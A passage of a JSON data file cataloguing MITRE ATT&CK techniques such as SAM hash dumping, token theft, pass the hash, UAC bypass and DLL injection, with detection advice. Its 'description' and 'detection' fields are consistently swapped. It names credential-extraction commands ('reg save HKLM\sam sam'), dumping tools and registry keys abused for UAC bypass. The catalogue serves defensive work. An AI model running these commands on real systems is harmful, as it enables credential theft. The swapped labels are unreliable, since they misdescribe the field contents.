                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n",
                "detection": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1562.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Disable or Modify Tools",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.",
                "detection": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux",
                    "Containers",
                    "IaaS"
                ]
            }
        },
        {
            "id": "T1134.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Parent PID Spoofing",
                "chain_phase": "defense-evasion",
                "description": "Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.",
                "detection": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be <code>explorer.exe</code> rather than an Office document delivered as part of Spearphishing Attachment. This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Make and Impersonate Token",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Token Impersonation/Theft",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1056.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Keylogging",
                "chain_phase": "collection",
                "description": "Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.",
                "detection": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. ",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux",
                    "Network"
                ]
            }
        },
        {
            "id": "T1003.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Security Account Manager",
                "chain_phase": "credential-access",
                "description": "Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",
                "detection": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.006",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Windows Remote Management",
                "chain_phase": "lateral-movement",
                "description": "Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement)",
                "detection": "Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "SSH",
                "chain_phase": "lateral-movement",
                "description": "Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",
                "detection": "Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1021.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Distributed Component Object Model",
                "chain_phase": "lateral-movement",
                "description": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.",
                "detection": "Adversaries may use Valid Accounts to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "SMB/Windows Admin Shares",
                "chain_phase": "lateral-movement",
                "description": "Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)",
                "detection": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Remote Desktop Protocol",
                "chain_phase": "lateral-movement",
                "description": "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",
                "detection": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1553.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Code Signing",
                "chain_phase": "defense-evasion",
                "description": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.",
                "detection": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.  \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. ",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.006",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Timestomp",
                "chain_phase": "defense-evasion",
                "description": "Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.",
                "detection": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1550.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Pass the Hash",
                "chain_phase": "defense-evasion",
                "description": "Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",
                "detection": "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1548.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Bypass User Account Control",
                "chain_phase": "privilege-escalation",
                "description": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes.",
                "detection": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. \n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.   An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1543.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Windows Service",
                "chain_phase": "persistence",
                "description": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg. \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.012",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Process Hollowing",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Dynamic-link Library Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL).  \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1137.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Office Template Macros",
                "chain_phase": "persistence",
                "description": "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)",
                "detection": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \n\nOffice Visual Basic for Applications (VBA) macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations. \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365"
                ]
            }
        },
        {
            "id": "T1197",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "BITS Jobs",
                "chain_phase": "defense-evasion",
                "description": "BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)",
                "detection": "Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.\n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1203",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Exploitation for Client Execution",
                "chain_phase": "execution",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
